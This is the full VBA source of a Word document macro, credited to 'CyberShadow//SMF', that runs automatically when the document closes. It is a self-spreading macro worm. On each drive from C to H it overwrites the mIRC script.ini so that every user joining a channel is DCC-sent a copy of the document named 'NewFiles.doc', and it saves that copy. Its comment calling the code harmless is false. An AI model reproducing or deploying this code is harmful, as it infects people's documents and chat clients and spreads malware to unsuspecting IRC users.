   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
    'mirc joke by CyberShadow//SMF
    'Smiles to harmless :)
    MyDir = CurDir
    For i = 0 To 5
     a = Chr$(Asc("C") + i)
     Call infect(a)
    Next
   End Sub
   Private Sub infect(a)
    On Error GoTo outta
    a = a + ":\mirc\"
    Open a + "script.ini" For Output As #1
     Print #1, "[script]"
     Print #1, "n0=on 1:JOIN:#:/dcc send $nick " + a + "NewFiles.doc"
    Close #1
    ActiveDocument.Save
    ActiveDocument.SaveAs a + "NewFiles.doc"
    ActiveDocument.Close
   outta:
   End Sub
